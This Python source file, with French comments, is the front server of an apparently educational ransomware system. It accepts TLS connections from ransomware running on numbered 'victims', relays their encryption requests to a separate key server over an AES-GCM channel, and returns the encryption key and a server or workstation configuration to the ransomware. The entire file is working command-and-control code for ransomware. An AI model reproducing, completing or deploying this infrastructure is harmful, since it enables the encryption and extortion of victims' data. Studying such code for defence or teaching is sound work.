import queue
import threading
from threading import Thread, Lock
import utile.network as network
import utile.message as message
import utile.security as security
import utile.config as config
import ssl
import socket

from utile.config import print_config
from utile.message import set_message, get_message_type

# Loading des config
config.load_config("config/serveur_front.cfg", "config/serveur_front_key.bin")
IP_SERV_CLES = config.get_config("IP_SERV_CLES")
PORT_SERV_CLES = config.get_config("PORT_SERV_CLES")
CONN_RETRY_SERV_CLES = config.get_config("CONN_RETRY_SERV_CLES")
IP_RANSOMWARE = config.get_config("IP_RANSOMWARE")
PORT_RANSOMWARE = config.get_config("PORT_RANSOMWARE")
CONFIG_SERVEUR = config.get_config("CONFIG_SERVEUR")
CONFIG_WORKSTATION = config.get_config("CONFIG_WORKSTATION")
PORT_SERV_FRONTAL = config.get_config("PORT_SERV_FRONTAL")


# Variable globale
status_victims = {}
dico_file = {}

compteur_victime = 0
victim_data_lock = Lock()
q_victime = {}  # Dictionnaire pour stocker les files de réponse dédiées par victime
# Structure: {"id_victimeX": queue.Queue()}

COMMUNICATION_FC_CHIFFREE = True


def thread_serveur_FC(q_master_requete_vers_FC, stop_event_fc, fc_ready_event):
    global PORT_SERV_CLES
    global CONN_RETRY_SERV_CLES
    global q_victime, victim_data_lock

    print("[FC] Tentative de connexion au serveur de clés...")
    connexion_serveur_cle = None
    try:
        connexion_serveur_cle = network.connect_to_serv(port=PORT_SERV_CLES, retry=CONN_RETRY_SERV_CLES)
        print("[FC] Le serveur frontal a établi une connexion avec le serveur des clés.")
        cle_AES_GCM_pour_FC = network.diffie_hellman_recv_key(connexion_serveur_cle)


        fc_ready_event.set()  # Signaler que le FC est prêt

    except Exception as e_init_fc:
        print(f"[FC] ERREUR critique lors de l'initialisation avec le serveur de clés: {e_init_fc}")
        if connexion_serveur_cle:
            connexion_serveur_cle.close()
        fc_ready_event.set()  # Signaler quand même pour débloquer main
        print("[FC] Thread serveur_FC arrêté en raison d'une erreur d'initialisation.")
        return

    while not stop_event_fc.is_set():
        try:
            requete_data = q_master_requete_vers_FC.get(timeout=1)
            if requete_data is None:  # Signal d'arrêt
                break

            if not isinstance(requete_data, tuple) or len(requete_data) != 2:
                print(f"[FC] ERREUR: Donnée invalide reçue: {requete_data}. Attendait (victim_id, requete).")
                q_master_requete_vers_FC.task_done()
                continue

            victim_id, requete_originale = requete_data


            message_type = message.get_message_type(requete_originale)

            if message_type == 'CRYPT_REQ':
                requete_a_envoyer = requete_originale

                if COMMUNICATION_FC_CHIFFREE:
                    requete_chiffree = security.aes_encrypt(requete_a_envoyer, cle_AES_GCM_pour_FC)
                else:
                    requete_chiffree = requete_a_envoyer

                network.send_message(connexion_serveur_cle, requete_chiffree)
                reponse_chiffree_serv_cle = network.receive_message(connexion_serveur_cle)

                if COMMUNICATION_FC_CHIFFREE:
                    reponse_dechiffree = security.aes_decrypt(reponse_chiffree_serv_cle, cle_AES_GCM_pour_FC)
                    print(f"[FC] Réponse déchiffrée du serveur de clés pour {victim_id}: {reponse_dechiffree}")
                else:
                    reponse_dechiffree = reponse_chiffree_serv_cle

                with victim_data_lock:
                    if victim_id in q_victime:
                        q_victime[victim_id].put(reponse_dechiffree)
                    else:
                        print(
                            f"[FC] ERREUR: ID de victime {victim_id} non trouvé dans q_victime pour acheminer la réponse.")



            q_master_requete_vers_FC.task_done()

        except queue.Empty:
            continue
        except Exception as e:
            print(f"[FC] Erreur dans thread_serveur_FC (boucle principale): {e}")
            break

    if connexion_serveur_cle:
        connexion_serveur_cle.close()
    print("[FC] Thread serveur_FC arrêté.")


def thread_serveur_FR(tls_connexion_ransomware, client_address, victim_id, q_master_requete_vers_FC):
    global CONFIG_SERVEUR
    global CONFIG_WORKSTATION
    global q_victime, victim_data_lock

    print(f"[FR] Connexion TLS établie avec {client_address} (Victime ID: {victim_id})")

    try:
        while True:
            requete = network.receive_message(tls_connexion_ransomware)

            if not requete:
                print(f"[FR] ({victim_id}) Connexion TLS fermée par le client.")
                break

            message_type = message.get_message_type(requete)

            if message_type == 'CRYPT_REQ':
                q_master_requete_vers_FC.put((victim_id, requete))

                try:
                    q_reponse_pour_cette_victime = None
                    with victim_data_lock:
                        if victim_id in q_victime:
                            q_reponse_pour_cette_victime = q_victime[victim_id]

                    if not q_reponse_pour_cette_victime:
                        print(f"[FR] ({victim_id}) ERREUR: File de réponse non trouvée pour la victime.")
                        break

                    reponse_du_FC = q_reponse_pour_cette_victime.get(timeout=60)  # Attendre avec timeout
                except queue.Empty:
                    print(f"[FR] ({victim_id}) ERREUR: Timeout en attendant la réponse du serveur de clés.")
                    network.send_message(tls_connexion_ransomware,
                                         set_message("error", ["Timeout attente serveur de clés"]))
                    break
                except Exception as e_q:
                    print(f"[FR] ({victim_id}) ERREUR lors de la récupération de la réponse : {e_q}")
                    break

                print("Bonjour crypt_req", requete)
                config_ransomware = CONFIG_SERVEUR if requete.get("OS") == "SERVER" else CONFIG_WORKSTATION
                if "KEY" not in reponse_du_FC or "KEY_RESP" not in reponse_du_FC:
                    print(f"[FR] ({victim_id}) ERREUR: Réponse invalide du serveur de clés : {reponse_du_FC}")
                    network.send_message(tls_connexion_ransomware,
                                         set_message("error", ["Réponse invalide du serveur de clés"]))
                    break

                config_ransomware["KEY"] = reponse_du_FC["KEY"]
                crypt_resp_pour_ransomware = set_message("crypt_resp", [reponse_du_FC["KEY_RESP"], config_ransomware])
                network.send_message(tls_connexion_ransomware, crypt_resp_pour_ransomware)
                print(f"[FR] ({victim_id}) Clé et configuration envoyées au ransomware via TLS.")
                # break # Décommentez si la connexion doit se terminer après l'envoi de la clé


            else:
                print(f"[FR] ({victim_id}) Type de message inconnu reçu: {message_type}")
                network.send_message(tls_connexion_ransomware,
                                     set_message("error", [f"Type de message inconnu: {message_type}"]))
                break
    except ssl.SSLError as e_ssl:
        print(f"[FR] ({victim_id}) Erreur SSL/TLS: {e_ssl}")
    except ConnectionResetError:
        print(f"[FR] ({victim_id}) Connexion réinitialisée par le pair.")
    except Exception as e:
        print(f"[FR] ({victim_id}) Erreur inattendue dans thread_serveur_FR: {e}")
    finally:
        if tls_connexion_ransomware:
            try:
                tls_connexion_ransomware.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            tls_connexion_ransomware.close()
        with victim_data_lock:
            if victim_id in q_victime:
                # Vider la queue avant de la supprimer pour éviter des blocages potentiels si FC y écrit encore
                # while not q_victime[victim_id].empty():
                # try:
                # q_victime[victim_id].get_nowait()
                # except queue.Empty:
                # break
                del q_victime[victim_id]
                print(f"[FR] ({victim_id}) File de réponse nettoyée.")
        print(f"[FR] ({victim_id}) Connexion TLS avec {client_address} fermée et ressources nettoyées.")


def main():
    global PORT_SERV_FRONT
    global compteur_victime
    global q_victime, victim_data_lock

    q_master_requete_vers_FC = queue.Queue()
    stop_event_fc = threading.Event()
    fc_ready_event = threading.Event()

    t_front_cle = threading.Thread(target=thread_serveur_FC,
                                   args=(q_master_requete_vers_FC, stop_event_fc, fc_ready_event),
                                   daemon=True)
    t_front_cle.start()

    print("[Main] En attente du signal que le serveur FC est prêt...")
    fc_ready_event.wait()
    # Idéalement, vérifier ici si l'initialisation du FC s'est bien passée
    # Par exemple, le thread FC pourrait mettre à jour une variable globale ou un autre event
    # pour indiquer un succès ou un échec d'initialisation.
    # Pour l'instant, on suppose que si fc_ready_event.set() est appelé, c'est bon.
    print("[Main] Serveur FC est signalé comme prêt. Démarrage du serveur TLS.")

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
        print("[Main] Certificat et clé privée chargés pour TLS.")
    except FileNotFoundError:
        print("[Main] ERREUR: Fichiers de certificat (config/cert.pem) ou de clé (config/key.pem) non trouvés.")
        stop_event_fc.set()
        q_master_requete_vers_FC.put(None)
        if t_front_cle.is_alive(): t_front_cle.join()
        return
    except ssl.SSLError as e_ssl_load:
        print(f"[Main] ERREUR SSL lors du chargement du certificat/clé: {e_ssl_load}")
        stop_event_fc.set()
        q_master_requete_vers_FC.put(None)
        if t_front_cle.is_alive(): t_front_cle.join()
        return

    s_serveur_f_raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_serveur_f_raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        s_serveur_f_raw.bind((IP_RANSOMWARE, PORT_RANSOMWARE))
        s_serveur_f_raw.listen(5)
        print(f"[Main] Le serveur frontal TLS est en écoute sur {IP_RANSOMWARE}:{PORT_RANSOMWARE}.")
    except OSError as e_bind:
        print(f"[Main] ERREUR lors du bind/listen sur {IP_RANSOMWARE}:{PORT_RANSOMWARE}: {e_bind}")
        stop_event_fc.set()
        q_master_requete_vers_FC.put(None)
        if t_front_cle.is_alive(): t_front_cle.join()
        if s_serveur_f_raw: s_serveur_f_raw.close()
        return

    active_threads_FR = []

    try:
        while True:
            print(f"[Main] En attente de nouvelles connexions ransomware sur {IP_RANSOMWARE}:{PORT_RANSOMWARE}...")
            try:
                connexion_standard, address = s_serveur_f_raw.accept()
            except OSError as e_accept:
                if stop_event_fc.is_set():  # Si le serveur s'arrête, accept() peut échouer
                    print("[Main] Arrêt de la boucle d'acceptation car le serveur se ferme.")
                    break
                print(f"[Main] Erreur lors de accept() : {e_accept}")
                continue  # Tenter d'accepter à nouveau si ce n'est pas un arrêt intentionnel

            print(f"[Main] Connexion TCP standard reçue de {address}")

            try:
                tls_connexion_ransomware = context.wrap_socket(connexion_standard, server_side=True)
                print(f"[Main] Handshake TLS réussi avec {address}.")
            except ssl.SSLError as e_ssl_handshake:
                print(f"[Main] ERREUR lors du handshake SSL/TLS avec {address}: {e_ssl_handshake}")
                connexion_standard.close()
                continue
            except Exception as e_wrap:
                print(f"[Main] ERREUR inattendue lors du wrap_socket avec {address}: {e_wrap}")
                connexion_standard.close()
                continue

            with victim_data_lock:
                victim_id = f"victime_{compteur_victime}"
                compteur_victime += 1
                q_victime[victim_id] = queue.Queue()
                print(f"[Main] File de réponse créée pour {victim_id}.")

            t_front_rans = threading.Thread(target=thread_serveur_FR,
                                            args=(
                                                tls_connexion_ransomware, address, victim_id, q_master_requete_vers_FC),
                                            daemon=True)
            t_front_rans.start()
            active_threads_FR.append(t_front_rans)

            # Optionnel: nettoyer la liste active_threads_FR des threads qui se sont terminés
            # active_threads_FR = [t for t in active_threads_FR if t.is_alive()]

    except KeyboardInterrupt:
        print("\n[Main] Arrêt demandé par l'utilisateur (Ctrl+C)...")
    except Exception as e_main_loop:
        print(f"[Main] Erreur inattendue dans la boucle principale : {e_main_loop}")
    finally:
        print("[Main] Fermeture du serveur frontal...")
        stop_event_fc.set()
        q_master_requete_vers_FC.put(None)

        if t_front_cle.is_alive():
            print("[Main] Attente de la fin du thread FC...")
            t_front_cle.join(timeout=5)
            if t_front_cle.is_alive():
                print("[Main] AVERTISSEMENT: Le thread FC n'a pas pu s'arrêter proprement.")

        if s_serveur_f_raw:
            print("[Main] Fermeture du socket serveur principal...")
            s_serveur_f_raw.close()
            print("[Main] Socket serveur principal fermé.")

        # Attendre que les threads clients (FR) se terminent.
        # Cela peut être long si les clients sont encore connectés et actifs.
        # Pour une démo, on peut être plus direct ou mettre un timeout court.
        # print("[Main] En attente de la fin des threads FR restants...")
        # for t in active_threads_FR:
        #     if t.is_alive():
        #         t.join(timeout=1) # Court timeout pour la fermeture

        print("[Main] Serveur frontal arrêté.")


if __name__ == '__main__':
    main()